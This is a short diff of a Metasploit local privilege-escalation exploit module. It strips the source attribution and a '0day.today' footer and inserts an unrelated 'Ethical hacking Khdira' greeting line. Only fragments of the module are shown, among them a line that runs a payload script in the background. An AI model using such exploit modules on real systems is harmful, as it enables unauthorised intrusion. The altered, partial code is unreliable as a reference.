@@ -1,9 +1,7 @@
 # Reporting
 ##
 # This module requires Metasploit: https://metasploit.com/download
-# Current source: https://github.com/rapid7/metasploit-framework
-##
- 
+ welcome to this page Ethical hacking Khdira
 class MetasploitModule < Msf::Exploit::Local
   Rank = GoodRanking
   include Msf::Exploit::EXE
@@ -245,5 +243,3 @@ system("#{pscript} &");
     Rex.sleep 1
   end
 end
- 
-#  0day.today [2020-01-27]  # 
